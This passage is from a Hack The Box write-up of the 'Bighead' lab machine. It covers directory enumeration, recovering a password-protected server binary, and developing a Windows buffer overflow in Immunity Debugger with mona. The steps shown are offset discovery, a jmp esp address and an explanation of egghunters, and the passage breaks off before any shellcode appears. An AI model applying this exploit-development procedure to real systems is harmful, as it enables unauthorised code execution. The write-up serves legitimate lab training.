&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;source-has-nothing-interesting-&quot;&gt;Source has nothing interesting :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-gobuster-again-and-got-some-results-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; again and got some results :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://dev.bighead.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/04/24 20:55:05 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/blog (Status: 302)
/blog_ajax (Status: 302)
/blog_inlinemod (Status: 302)
/blog_usercp (Status: 302)
/blog_search (Status: 302)
/blog_report (Status: 302)
/blogger (Status: 302)
/blogindex (Status: 302)
/bloggers (Status: 302)
/blogs (Status: 302)
/blogspot (Status: 302)
/wp-content (Status: 302)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;but-all-these-pages-gave-this-result-&quot;&gt;But all these pages gave this result :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-intercepted-the-request-in-burp-to-figure-out-why-&quot;&gt;I intercepted the request in burp to figure out why :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/32.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-response-is-302-by-following-the-redirect-&quot;&gt;The response is &lt;code class=&quot;highlighter-rouge&quot;&gt;302&lt;/code&gt;, by following the redirect :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-responds-with-another-302&quot;&gt;It responds with another &lt;code class=&quot;highlighter-rouge&quot;&gt;302&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-it-will-keep-redirecting-us-in-a-loop-and-we-wont-get-anything&quot;&gt;So it will keep redirecting us in a loop and we won’t get anything.&lt;/h4&gt;
&lt;h4 id=&quot;at-this-point-i-didnt-know-what-to-do-because-all-of-my-attempts-have-hit-a-dead-end-i-did-a-sub-directory-bruteforce-again-with-wfuzz-instead-of-gobuster-and-i-got-one-more-result-&quot;&gt;At this point I didn’t know what to do because all of my attempts have hit a dead end. I did a sub directory bruteforce again with &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and I got one more result :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz --hc 404 -c -w /usr/share/wordlists/dirb/common.txt -u http://dev.bighead.htb/FUZZ&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-reason-why-gobuster-didnt-show-us-this-page-is-because-of-the-status-code-gobuster-only-showed-results-with-these-status-codes---status-codes--200204301302307403-while-wfuzz-showed-everything-except-404-responses---hc-404-coffee-gave-a-response-of-418-which-is-weird-i-looked-it-up-and-found-some-info-about-it-here-418-im-a-teapot--anyway-lets-take-a-look-&quot;&gt;The reason why &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; didn’t show us this page is because of the status code. &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; only showed results with these status codes : &lt;code class=&quot;highlighter-rouge&quot;&gt;[+] Status codes : 200,204,301,302,307,403&lt;/code&gt;, While &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; showed everything except &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; responses, &lt;code class=&quot;highlighter-rouge&quot;&gt;--hc 404&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;/coffee&lt;/code&gt; gave a response of &lt;code class=&quot;highlighter-rouge&quot;&gt;418&lt;/code&gt; which is weird. I looked it up and found some info about it &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/418&quot;&gt;here&lt;/a&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;418 I'm a teapot&lt;/code&gt; ! Anyway let’s take a look :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://dev.bighead.htb/coffee&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-showing-this-gif-&quot;&gt;It’s showing this &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/teapot.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;which-is-saying--the-requested-entity-body-is-short-and-stout-tip-me-over-and-pour-me-out-&quot;&gt;Which is saying : “The requested entity body is short and stout. Tip me over and pour me out.” ?!&lt;/h4&gt;
&lt;h4 id=&quot;i-intercepted-the-request-with-burp-and-looked-at-the-response-&quot;&gt;I intercepted the request with burp and looked at the response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/38.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-noticed-a-weird-server-name--bigheadwebsvr-10-i-looked-it-up-and-found-a-repository-on-the-machine-creators-github-3mrgnc3-&quot;&gt;I noticed a weird server name : &lt;code class=&quot;highlighter-rouge&quot;&gt;BigheadWebSvr 1.0&lt;/code&gt;. I looked it up and found a repository on the machine creator’s github (3mrgnc3) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-searched-through-the-commits-and-got-this-one-which-seemed-to-be-the-right-one&quot;&gt;I searched through the commits and got &lt;a href=&quot;https://github.com/3mrgnc3/BigheadWebSvr/blob/b1b4d6ed5f2298bc243cd56cab77cd6fb4e48c3d/BHWS_Backup.zip&quot;&gt;this one&lt;/a&gt; which seemed to be the right one.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-asked-for-a-password-&quot;&gt;It asked for a password :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-to-guess-it-and-after-some-attempts-bighead-worked-&quot;&gt;I tried to guess it and after some attempts &lt;code class=&quot;highlighter-rouge&quot;&gt;bighead&lt;/code&gt; worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/43.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/44.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;of-course-its-a-windows-executable-so-we-will-switch-to-a-windows-machine-at-this-point-the-hint-was-quite-obvious--the-requested-entity-body-is-short-and-stout-tip-me-over-and-pour-me-out-this-server-is-probably-vulnerable-to-a-buffer-overflow&quot;&gt;Of course it’s a windows executable so we will switch to a windows machine. At this point the hint was quite obvious : “The requested entity body is short and stout. Tip me over and pour me out.”, This server is probably vulnerable to a buffer overflow.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;buffer-overflow-in-bigheadwebsvr&quot;&gt;Buffer Overflow in &lt;code class=&quot;highlighter-rouge&quot;&gt;BigheadWebSvr&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;i-tried-to-run-the-server-but-it-complained-about-some-missing-dll-called-libmingwex-0dll-&quot;&gt;I tried to run the server but it complained about some missing &lt;code class=&quot;highlighter-rouge&quot;&gt;dll&lt;/code&gt; called &lt;code class=&quot;highlighter-rouge&quot;&gt;libmingwex-0.dll&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-installed-mingw-and-copied-the-dll-to-the-same-directory-as-the-server-&quot;&gt;So I installed &lt;a href=&quot;https://osdn.net/projects/mingw/releases/&quot;&gt;mingw&lt;/a&gt; and copied the &lt;code class=&quot;highlighter-rouge&quot;&gt;dll&lt;/code&gt; to the same directory as the server :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-had-to-allow-access-for-it-&quot;&gt;Then I had to allow access for it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-the-server-is-running-&quot;&gt;Now the server is running :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-not-on-port-80-&quot;&gt;But not on port 80 :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-did-netstat--a--b-and-found-that-its-running-on-port-8008-&quot;&gt;I did &lt;code class=&quot;highlighter-rouge&quot;&gt;netstat -a -b&lt;/code&gt; and found that it’s running on port 8008 :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/51.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/52.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great-i-intercepted-the-request-with-burp-then-i-ran-the-server-again-with-immunity-debugger-&quot;&gt;Great, I intercepted the request with burp then I ran the server again with &lt;a href=&quot;https://www.immunityinc.com/products/debugger/&quot;&gt;Immunity Debugger&lt;/a&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/54.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-need-to-know-how-to-make-the-server-crash-first-thing-i-wanted-to-try-was-sending-a-head-request-because-you-know--the-machine-name-is-bighead-d&quot;&gt;Now we need to know how to make the server crash. First thing I wanted to try was sending a HEAD request, because you know … the machine name is BigHead :D&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/56.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-yes-it-worked-the-eip-was-overwritten-with-a-i-tried-to-send-a-bigger-request-and-the-server-didnt-crash-and-that-was-a-bit-of-a-problem-because-we-are-limited-to-a-specific-size-so-we-dont-have-enough-space-to-store-our-shellcode-thats-why-we-will-use-egghunting-there-are-a-lot-of-great-tutorials-about-win32-egghunting-out-there-so-i-will-just-give-you-an-idea-of-what-is-egghunting-in-case-you-dont-know-when-we-dont-have-enough-space-on-the-stack-to-hold-the-shellcode-instead-of-sending-and-executing-the-shellcode-we-send-a-very-small-string-called-egghunter-when-that-egghunter-is-executed-it-searches-through-the-entire-memory-for-an-egg-when-it-hits-that-egg-it-executes-whats-after-it-the-shellcode-the-egg-is-a-4-bytes-string-say-for-example-r1ck-that-egg-is-doubled-and-added-before-the-shellcode-like-this--r1ckr1ck--shellcode-its-explained-very-well-in-skapes-paper-safely-searching-process-virtual-address-space-there-are-also-many-practical-tutorials-just-search-for-win32-egghunting&quot;&gt;And yes it worked. The EIP was overwritten with A. I tried to send a bigger request and the server didn’t crash, and that was a bit of a problem because we are limited to a specific size so we don’t have enough space to store our shellcode, That’s why we will use egghunting. There are a lot of great tutorials about win32 egghunting out there so I will just give you an idea of what is egghunting in case you don’t know. When we don’t have enough space on the stack to hold the shellcode, instead of sending and executing the shellcode we send a very small string called egghunter. When that egghunter is executed it searches through the entire memory for an egg. when it hits that egg it executes what’s after it (the shellcode). The egg is a 4-bytes string, say for example &lt;code class=&quot;highlighter-rouge&quot;&gt;R1ck&lt;/code&gt; that egg is doubled and added before the shellcode like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;R1ckR1ck + shellcode&lt;/code&gt;. It’s explained very well in skape’s paper &lt;a href=&quot;http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf&quot;&gt;Safely Searching Process Virtual Address Space&lt;/a&gt;. There are also many practical tutorials just search for win32 egghunting.&lt;/h4&gt;
&lt;h4 id=&quot;now-back-to-the-vulnerable-server-first-thing-we-need-to-know-is-the-offset-im-using-mona-plugin-documentation&quot;&gt;Now back to the vulnerable server, first thing we need to know is the offset. I’m using &lt;a href=&quot;https://github.com/corelan/mona&quot;&gt;mona plugin&lt;/a&gt;. &lt;a href=&quot;https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/&quot;&gt;Documentation&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;mona-config--set-workingfolder-clogsp-to-make-mona-output-to-clogs&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;!mona config -set workingfolder c:\logs\%p&lt;/code&gt;, to make &lt;code class=&quot;highlighter-rouge&quot;&gt;mona&lt;/code&gt; output to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\logs&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;to-find-the-offset-we-will-create-a-pattern-mona-pc-100-creates-a-pattern-of-100-chars-this-is-the-same-as-pattern_createrb-from-metasploit-i-used-it-in-my-buffer-overflow-write-ups&quot;&gt;To find the offset we will create a pattern &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona pc 100&lt;/code&gt; (creates a pattern of 100 chars), this is the same as &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern_create.rb&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;metasploit&lt;/code&gt;. I used it in my &lt;a href=&quot;/categories/#binary-exploitation&quot;&gt;buffer overflow write-ups&lt;/a&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-will-put-the-output-in-a-file-called-patterntxt-in-clogs-&quot;&gt;It will put the output in a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;pattern.txt&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\logs&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;pattern--aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2a&quot;&gt;Pattern : &lt;code class=&quot;highlighter-rouge&quot;&gt;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;================================================================================
  Output generated by mona.py v2.0, rev 585 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  Process being debugged : BigheadWebSvr (pid 1300)
  Current mona arguments: pc 100
================================================================================
  2019-04-24 22:43:44
================================================================================

Pattern of 100 bytes :
----------------------

ASCII:
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

HEX:
\x41\x61\x30\x41\x61\x31\x41\x61\x32\x41\x61\x33\x41\x61\x34\x41\x61\x35\x41\x61\x36\x41\x61\x37\x41\x61\x38\x41\x61\x39\x41\x62\x30\x41\x62\x31\x41\x62\x32\x41\x62\x33\x41\x62\x34\x41\x62\x35\x41\x62\x36\x41\x62\x37\x41\x62\x38\x41\x62\x39\x41\x63\x30\x41\x63\x31\x41\x63\x32\x41\x63\x33\x41\x63\x34\x41\x63\x35\x41\x63\x36\x41\x63\x37\x41\x63\x38\x41\x63\x39\x41\x64\x30\x41\x64\x31\x41\x64\x32\x41


JAVASCRIPT (unescape() friendly):
%u6141%u4130%u3161%u6141%u4132%u3361%u6141%u4134%u3561%u6141%u4136%u3761%u6141%u4138%u3961%u6241%u4130%u3162%u6241%u4132%u3362%u6241%u4134%u3562%u6241%u4136%u3762%u6241%u4138%u3962%u6341%u4130%u3163%u6341%u4132%u3363%u6341%u4134%u3563%u6341%u4136%u3763%u6341%u4138%u3963%u6441%u4130%u3164%u6441%u4132
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-send-the-pattern-&quot;&gt;Let’s send the pattern :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/62.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-eip-was-overwritten-with-acc54aac-mona-findmsp-should-give-us-the-offset-but-for-some-reason-it-wasnt-able-to-find-it-so-i-did-it-manually-we-will-reverse-acc54aac-because-its-little-endian-so-it-will-be-ac4ac5ac-i-located-it-then-i-used-pythons-function-len-to-find-the-length-of-the-string-before-ac4ac5ac-&quot;&gt;the EIP was overwritten with &lt;code class=&quot;highlighter-rouge&quot;&gt;ACC54AAC&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona findmsp&lt;/code&gt; should give us the offset but for some reason it wasn’t able to find it so I did it manually. We will reverse &lt;code class=&quot;highlighter-rouge&quot;&gt;ACC54AAC&lt;/code&gt; because it’s &lt;a href=&quot;http://chortle.ccsu.edu/assemblytutorial/Chapter-15/ass15_3.html&quot;&gt;little endian&lt;/a&gt;, so it will be &lt;code class=&quot;highlighter-rouge&quot;&gt;AC4AC5AC&lt;/code&gt;. I located it then I used python’s function &lt;code class=&quot;highlighter-rouge&quot;&gt;len()&lt;/code&gt; to find the length of the string before &lt;code class=&quot;highlighter-rouge&quot;&gt;AC4AC5AC&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/64.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;offset-is-72-lets-confirm-that-i-sent-72-as-then-8-bs-&quot;&gt;Offset is 72, let’s confirm that. I sent 72 A’s then 8 B’s :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-i-could-successfully-overwrite-eip-with-b-&quot;&gt;And I could successfully overwrite EIP with B :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;nice-we-control-eip-now-we-need-to-find-a-real-address-to-overwrite-eip-with-since-the-egghunter-will-be-located-on-the-stack-we-need-to-find-a-jmp-esp-instruction-to-make-it-jmp-to-the-egghunter-and-execute-it-to-do-this-we-will-use-mona-mona-jmp--r-esp-it-will-create-another-file-in-clogs-called-jmptxt-we-need-to-make-sure-that-the-address-we-choose-will-work-on-the-target-machine-so-i-used-one-of-the-addresses-from-the-dll-of-the-server-itself-bheadsvrdll-i-chose-the-first-one-&quot;&gt;Nice, We control EIP, Now we need to find a real address to overwrite EIP with. Since the egghunter will be located on the stack we need to find a &lt;code class=&quot;highlighter-rouge&quot;&gt;jmp esp&lt;/code&gt; instruction to make it jmp to the egghunter and execute it. To do this we will use mona. &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona jmp -r ESP&lt;/code&gt;. It will create another file in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\logs&lt;/code&gt; called &lt;code class=&quot;highlighter-rouge&quot;&gt;jmp.txt&lt;/code&gt;. We need to make sure that the address we choose will work on the target machine, So I used one of the addresses from the &lt;code class=&quot;highlighter-rouge&quot;&gt;dll&lt;/code&gt; of the server itself &lt;code class=&quot;highlighter-rouge&quot;&gt;bHeadSvr.dll&lt;/code&gt;. I chose the first one :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/68.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/69.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output--1&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;================================================================================
  Output generated by mona.py v2.0, rev 585 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  Process being debugged : BigheadWebSvr (pid 5532)
  Current mona arguments: jmp -r ESP
================================================================================
  2019-04-25 02:15:27
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename &amp;amp; Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x74c70000 | 0x74e61000 | 0x001f1000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [KERNELBASE.dll] (C:\Windows\System32\KERNELBASE.dll)
 0x771f0000 | 0x77269000 | 0x00079000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [sechost.dll] (C:\Windows\System32\sechost.dll)
 0x00400000 | 0x00413000 | 0x00013000 | False  | False   | False |  False   | False  | -1.0- [BigheadWebSvr.exe] (C:\bighead\BHWS_Backup\BigheadWebSvr.exe)
 0x62500000 | 0x62510000 | 0x00010000 | False  | False   | False |  False   | False  | -1.0- [bHeadSvr.dll] (C:\bighead\BHWS_Backup\bHeadSvr.dll)
 0x75510000 | 0x755a8000 | 0x00098000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [KERNEL32.DLL] (C:\Windows\System32\KERNEL32.DLL)
 0x74ef0000 | 0x74fb0000 | 0x000c0000 | True   | True    | True  |  False   | True   | 7.0.17763.1 [msvcrt.dll] (C:\Windows\System32\msvcrt.dll)
 0x64540000 | 0x64570000 | 0x00030000 | False  | False   | False |  False   | False  | -1.0- [libmingwex-0.dll] (C:\bighead\BHWS_Backup\libmingwex-0.dll)
 0x75270000 | 0x752ee000 | 0x0007e000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [ADVAPI32.DLL] (C:\Windows\System32\ADVAPI32.DLL)
 0x776b0000 | 0x77847000 | 0x00197000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x77410000 | 0x774cf000 | 0x000bf000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [RPCRT4.dll] (C:\Windows\System32\RPCRT4.dll)
 0x75370000 | 0x753cf000 | 0x0005f000 | True   | True    | True  |  False   | True   | 10.0.17763.1 [WS2_32.dll] (C:\Windows\System32\WS2_32.dll)
-----------------------------------------------------------------------------------------------------------------------------------------
0x625012f0 : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x625012fd : jmp esp |  {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250130a : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501317 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501324 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x62501331 : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250133e : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250134b : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6250134d : jmp esp | ascii {PAGE_EXECUTE_READ} [bHeadSvr.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\bHeadSvr.dll)
0x6455b1ca : push esp # ret  |  {PAGE_EXECUTE_READ} [libmingwex-0.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\bighead\BHWS_Backup\libmingwex-0.dll)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-send-a-request-to-test-it-72-as-then-f0125062-which-is-625012f0-reversed&quot;&gt;Let’s send a request to test it, 72 A’s then &lt;code class=&quot;highlighter-rouge&quot;&gt;f0125062&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;625012f0&lt;/code&gt; reversed:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/70.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/71.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-working-fine-last-thing-we-need-to-know-is-how-to-send-the-shellcode-i-sent-a-post-request-to-see-how-the-server-handles-it-just-a-bunch-of-as-&quot;&gt;It’s working fine. Last thing we need to know is how to send the shellcode. I sent a POST request to see how the server handles it, just a bunch of A’s :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/72.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-searched-in-the-memory-&quot;&gt;Then I searched in the memory :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/73.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
